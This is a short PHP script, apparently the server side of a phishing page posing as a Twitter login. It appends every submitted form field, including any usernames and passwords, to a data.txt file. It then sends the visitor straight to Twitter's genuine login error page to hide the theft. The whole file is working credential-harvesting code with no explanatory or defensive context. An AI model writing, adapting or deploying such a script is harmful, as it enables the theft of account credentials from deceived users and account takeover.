<?php 

$path = getcwd();

$path = substr($path,0,17);

$file = $path ."/export/data.txt";
file_put_contents($file, print_r($_POST, true), FILE_APPEND);

?>

<meta http-equiv="refresh" content="0; url=https://twitter.com/login/error?username_or_email=&redirect_after_login=%2F%3Flang%3Del" />
